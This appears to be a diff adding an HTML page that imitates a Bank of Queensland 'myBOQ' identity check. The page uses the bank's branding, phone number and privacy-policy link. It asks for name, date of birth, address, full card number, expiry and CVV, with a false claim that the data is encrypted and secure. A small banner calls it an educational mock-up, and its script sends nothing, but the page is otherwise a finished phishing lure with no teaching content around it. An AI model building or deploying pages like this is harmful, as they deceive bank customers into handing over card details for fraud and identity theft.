@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>myBOQ - Identification Information</title>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        /* ----- RESET & BASE ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #eef2f7;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 16px;
+        }
+
+        /* ----- MAIN CARD CONTAINER ----- */
+        .boq-card {
+            max-width: 640px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 12px 40px rgba(0, 20, 50, 0.12);
+            overflow: hidden;
+            transition: box-shadow 0.25s ease;
+        }
+
+        .boq-card:hover {
+            box-shadow: 0 20px 56px rgba(0, 20, 50, 0.16);
+        }
+
+        /* ----- HEADER (BOQ brand) ----- */
+        .boq-header {
+            background: #003366;
+            /* BOQ deep blue */
+            padding: 22px 30px 18px 30px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .boq-header .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .boq-header .logo i {
+            font-size: 28px;
+            color: #ffcc00;
+            /* BOQ gold */
+        }
+
+        .boq-header .logo span {
+            font-weight: 600;
+            font-size: 22px;
+            letter-spacing: 0.5px;
+            color: #ffffff;
+        }
+
+        .boq-header .logo span small {
+            font-weight: 300;
+            font-size: 14px;
+            color: #b3cce6;
+            margin-left: 6px;
+        }
+
+        .boq-header .badge {
+            margin-left: auto;
+            background: rgba(255, 255, 255, 0.12);
+            padding: 6px 16px;
+            border-radius: 40px;
+            color: #ffffff;
+            font-size: 13px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        /* ----- FORM BODY ----- */
+        .boq-body {
+            padding: 32px 30px 28px 30px;
+        }
+
+        .boq-body h2 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #003366;
+            margin-bottom: 4px;
+        }
+
+        .boq-body .subhead {
+            color: #4d5e70;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 28px;
+            border-left: 4px solid #ffcc00;
+            padding-left: 16px;
+            background: #f8faff;
+            border-radius: 0 8px 8px 0;
+            padding: 12px 16px;
+        }
+
+        .boq-body .subhead i {
+            color: #003366;
+            margin-right: 8px;
+        }
+
+        /* ----- FORM ELEMENTS ----- */
+        .form-group {
+            margin-bottom: 22px;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 18px;
+            flex-wrap: wrap;
+        }
+
+        .form-row .form-group {
+            flex: 1 1 180px;
+            min-width: 140px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #1a2b3c;
+            margin-bottom: 5px;
+            letter-spacing: 0.2px;
+        }
+
+        label .required {
+            color: #cc2233;
+            margin-left: 2px;
+        }
+
+        label .hint {
+            font-weight: 400;
+            color: #6b7d8f;
+            font-size: 12px;
+            margin-left: 4px;
+        }
+
+        input,
+        select {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 15px;
+            border: 1.5px solid #d0d9e3;
+            border-radius: 10px;
+            background: #fafcfe;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            color: #0a1a2a;
+            font-family: inherit;
+        }
+
+        input:focus,
+        select:focus {
+            outline: none;
+            border-color: #003366;
+            box-shadow: 0 0 0 4px rgba(0, 51, 102, 0.08);
+            background: #ffffff;
+        }
+
+        input::placeholder {
+            color: #9aabbb;
+            font-size: 14px;
+        }
+
+        /* card input with icon */
+        .input-icon-wrap {
+            position: relative;
+        }
+
+        .input-icon-wrap i {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #6b7d8f;
+            font-size: 16px;
+        }
+
+        .input-icon-wrap input {
+            padding-left: 40px;
+        }
+
+        /* small helper text */
+        .helper-text {
+            font-size: 12px;
+            color: #6b7d8f;
+            margin-top: 5px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .helper-text i {
+            font-size: 13px;
+            color: #003366;
+        }
+
+        /* ----- DIVIDER ----- */
+        .divider {
+            border: none;
+            border-top: 1.5px solid #e6ecf3;
+            margin: 28px 0 24px 0;
+        }
+
+        /* ----- SECURITY NOTICE ----- */
+        .security-notice {
+            background: #f2f6fc;
+            border-radius: 12px;
+            padding: 16px 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+            margin-bottom: 28px;
+            border: 1px solid #e0e9f2;
+        }
+
+        .security-notice i {
+            color: #003366;
+            font-size: 20px;
+            margin-top: 2px;
+        }
+
+        .security-notice p {
+            font-size: 13.5px;
+            color: #1a2b3c;
+            line-height: 1.5;
+        }
+
+        .security-notice a {
+            color: #003366;
+            font-weight: 600;
+            text-decoration: none;
+            border-bottom: 1px dotted #b3cce6;
+        }
+
+        .security-notice a:hover {
+            border-bottom: 1px solid #003366;
+        }
+
+        /* ----- SUBMIT BUTTON ----- */
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: #003366;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #ffffff;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            letter-spacing: 0.3px;
+            margin-top: 6px;
+        }
+
+        .btn-submit:hover {
+            background: #002244;
+        }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
+        .btn-submit i {
+            font-size: 18px;
+        }
+
+        /* ----- FOOTER ----- */
+        .boq-footer {
+            background: #f8faff;
+            padding: 18px 30px;
+            border-top: 1px solid #e6ecf3;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12.5px;
+            color: #4d5e70;
+        }
+
+        .boq-footer a {
+            color: #003366;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .boq-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .boq-footer .copy {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* ----- RESPONSIVE ----- */
+        @media (max-width: 520px) {
+            .boq-header {
+                padding: 18px 18px 14px 18px;
+            }
+            .boq-header .logo span {
+                font-size: 18px;
+            }
+            .boq-header .badge {
+                font-size: 11px;
+                padding: 4px 12px;
+            }
+            .boq-body {
+                padding: 22px 18px 20px 18px;
+            }
+            .boq-body h2 {
+                font-size: 20px;
+            }
+            .form-row {
+                gap: 10px;
+            }
+            .form-row .form-group {
+                flex: 1 1 100%;
+                min-width: 100%;
+            }
+            .boq-footer {
+                flex-direction: column;
+                gap: 8px;
+                text-align: center;
+                padding: 16px 18px;
+            }
+            .btn-submit {
+                font-size: 16px;
+                padding: 14px;
+            }
+            .security-notice {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .boq-header .logo i {
+                font-size: 22px;
+            }
+            .boq-header .logo span {
+                font-size: 16px;
+            }
+            input,
+            select {
+                padding: 10px 12px;
+                font-size: 14px;
+            }
+        }
+
+        /* ----- DEMO BANNER (non‑BOQ) ----- */
+        .demo-banner {
+            max-width: 640px;
+            width: 100%;
+            margin-bottom: 14px;
+            background: #fff8e6;
+            border: 1px solid #ffd966;
+            border-radius: 12px;
+            padding: 12px 20px;
+            font-size: 14px;
+            color: #664d00;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .demo-banner i {
+            font-size: 18px;
+            color: #b8860b;
+        }
+
+        .demo-banner strong {
+            color: #003366;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Demo disclaimer -->
+    <div class="demo-banner">
+        <i class="fas fa-info-circle"></i>
+        <span><strong>Demonstration</strong> — This is a mock‑up for educational purposes only. No data is collected or stored.</span>
+    </div>
+
+    <!-- Main BOQ card -->
+    <div class="boq-card">
+
+        <!-- Header -->
+        <header class="boq-header">
+            <div class="logo">
+                <i class="fas fa-university"></i>
+                <span>myBOQ <small>self‑service</small></span>
+            </div>
+            <div class="badge">
+                <i class="fas fa-shield-alt" style="margin-right:6px;"></i> Secure
+            </div>
+        </header>
+
+        <!-- Form body -->
+        <div class="boq-body">
+
+            <h2>Identification Information</h2>
+            <div class="subhead">
+                <i class="fas fa-lock"></i>
+                To keep your account safe we need to confirm and verify who you are.
+                Once you enter your information you will receive a verification code via SMS.
+            </div>
+
+            <form id="identificationForm" novalidate>
+
+                <!-- NAME -->
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="firstName">First name <span class="required">*</span></label>
+                        <input type="text" id="firstName" name="firstName" placeholder="e.g. Benjamin" required />
+                        <div class="helper-text"><i class="fas fa-info-circle"></i> As shown on your ID</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="lastName">Last name <span class="required">*</span></label>
+                        <input type="text" id="lastName" name="lastName" placeholder="e.g. Smith" required />
+                        <div class="helper-text"><i class="fas fa-info-circle"></i> As shown on your ID</div>
+                    </div>
+                </div>
+
+                <!-- DATE OF BIRTH -->
+                <div class="form-group">
+                    <label for="dob">Date of birth <span class="required">*</span></label>
+                    <input type="text" id="dob" name="dob" placeholder="DD/MM/YYYY e.g. 01/01/1970" required />
+                    <div class="helper-text"><i class="fas fa-info-circle"></i> Format: DD/MM/YYYY</div>
+                </div>
+
+                <!-- ADDRESS -->
+                <div class="form-group">
+                    <label for="address">Street address <span class="required">*</span></label>
+                    <input type="text" id="address" name="address" placeholder="e.g. 123 Queen Street" required />
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="city">City / Suburb <span class="required">*</span></label>
+                        <input type="text" id="city" name="city" placeholder="e.g. Brisbane" required />
+                    </div>
+                    <div class="form-group">
+                        <label for="state">State <span class="required">*</span></label>
+                        <select id="state" name="state" required>
+                            <option value="">Select</option>
+                            <option value="NSW">NSW</option>
+                            <option value="VIC">VIC</option>
+                            <option value="QLD">QLD</option>
+                            <option value="WA">WA</option>
+                            <option value="SA">SA</option>
+                            <option value="TAS">TAS</option>
+                            <option value="ACT">ACT</option>
+                            <option value="NT">NT</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="postcode">Postcode <span class="required">*</span></label>
+                        <input type="text" id="postcode" name="postcode" placeholder="e.g. 4000" required />
+                    </div>
+                </div>
+
+                <hr class="divider" />
+
+                <!-- CARD DETAILS -->
+                <div style="margin-bottom:6px;">
+                    <label style="font-size:15px; font-weight:600; color:#003366;">
+                        <i class="fas fa-credit-card" style="margin-right:8px;"></i> Card details
+                    </label>
+                    <p style="font-size:13px; color:#4d5e70; margin-top:2px;">We use this to verify your identity.</p>
+                </div>
+
+                <div class="form-group">
+                    <label for="cardNumber">Card number <span class="required">*</span></label>
+                    <div class="input-icon-wrap">
+                        <i class="fas fa-credit-card"></i>
+                        <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required />
+                    </div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="expiry">Expiry <span class="required">*</span></label>
+                        <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required />
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv">CVV <span class="required">*</span></label>
+                        <input type="text" id="cvv" name="cvv" placeholder="•••" required />
+                        <div class="helper-text"><i class="fas fa-info-circle"></i> 3‑digit code on back</div>
+                    </div>
+                </div>
+
+                <!-- Security notice -->
+                <div class="security-notice">
+                    <i class="fas fa-shield-alt"></i>
+                    <p>
+                        Your information is encrypted and secure. BOQ will never ask for your
+                        password or full PIN via this form. Read our
+                        <a href="https://www.boq.com.au/important-information#privacypolicy" target="_blank">Privacy Policy</a>.
+                    </p>
+                </div>
+
+                <!-- Submit -->
+                <button type="submit" class="btn-submit">
+                    <i class="fas fa-arrow-right"></i> Continue
+                </button>
+
+            </form>
+        </div>
+
+        <!-- Footer -->
+        <footer class="boq-footer">
+            <span class="copy">
+                <i class="fas fa-lock" style="font-size:11px;"></i>
+                &copy; 2026 Bank of Queensland
+            </span>
+            <span>
+                <a href="#"><i class="fas fa-question-circle"></i> Help</a>
+                &nbsp;&middot;&nbsp;
+                <a href="#"><i class="fas fa-phone-alt"></i> 1300 55 72 72</a>
+            </span>
+        </footer>
+
+    </div>
+
+    <!-- Simple form handler (demo) -->
+    <script>
+        (function() {
+            const form = document.getElementById('identificationForm');
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                // Basic validation feedback (demo only)
+                const inputs = form.querySelectorAll('input[required], select[required]');
+                let valid = true;
+
+                inputs.forEach(el => {
+                    if (!el.value.trim()) {
+                        el.style.borderColor = '#cc2233';
+                        el.style.backgroundColor = '#fff6f6';
+                        valid = false;
+                    } else {
+                        el.style.borderColor = '';
+                        el.style.backgroundColor = '';
+                    }
+                });
+
+                if (!valid) {
+                    alert('Please fill in all required fields.');
+                    return;
+                }
+
+                // Simulate submission
+                const btn = form.querySelector('.btn-submit');
+                const originalText = btn.innerHTML;
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
+                btn.disabled = true;
+
+                setTimeout(() => {
+                    btn.innerHTML = '<i class="fas fa-check-circle"></i> Verified!';
+                    btn.style.background = '#1a7a3a';
+
+                    setTimeout(() => {
+                        btn.innerHTML = originalText;
+                        btn.style.background = '';
+                        btn.disabled = false;
+                        alert('Demo: Your details have been verified successfully.\n(No data was sent or stored.)');
+                        form.reset();
+                        // reset styles
+                        inputs.forEach(el => {
+                            el.style.borderColor = '';
+                            el.style.backgroundColor = '';
+                        });
+                    }, 1200);
+                }, 1400);
+            });
+
+            // Real‑time validation styling cleanup
+            form.querySelectorAll('input, select').forEach(el => {
+                el.addEventListener('input', function() {
+                    if (this.value.trim()) {
+                        this.style.borderColor = '';
+                        this.style.backgroundColor = '';
+                    }
+                });
+                el.addEventListener('change', function() {
+                    if (this.value.trim()) {
+                        this.style.borderColor = '';
+                        this.style.backgroundColor = '';
+                    }
+                });
+            });
+
+            // Format card number with spaces (visual only)
+            const cardInput = document.getElementById('cardNumber');
+            cardInput.addEventListener('input', function() {
+                let raw = this.value.replace(/\s/g, '');
+                if (raw.length > 16) raw = raw.slice(0, 16);
+                let formatted = '';
+                for (let i = 0; i < raw.length; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += raw[i];
+                }
+                this.value = formatted;
+            });
+
+            // Expiry: auto‑slash
+            const expiryInput = document.getElementById('expiry');
+            expiryInput.addEventListener('input', function() {
+                let raw = this.value.replace(/\D/g, '');
+                if (raw.length > 4) raw = raw.slice(0, 4);
+                if (raw.length >= 2) {
+                    this.value = raw.slice(0, 2) + '/' + raw.slice(2);
+                } else {
+                    this.value = raw;
+                }
+            });
+
+            // CVV: digits only, max 4
+            const cvvInput = document.getElementById('cvv');
+            cvvInput.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '').slice(0, 4);
+            });
+
+            // DOB: auto‑slash
+            const dobInput = document.getElementById('dob');
+            dobInput.addEventListener('input', function() {
+                let raw = this.value.replace(/\D/g, '');
+                if (raw.length > 8) raw = raw.slice(0, 8);
+                if (raw.length >= 4) {
+                    this.value = raw.slice(0, 2) + '/' + raw.slice(2, 4) + '/' + raw.slice(4);
+                } else if (raw.length >= 2) {
+                    this.value = raw.slice(0, 2) + '/' + raw.slice(2);
+                } else {
+                    this.value = raw;
+                }
+            });
+
+        })();
+    </script>
+
+</body>
+</html>
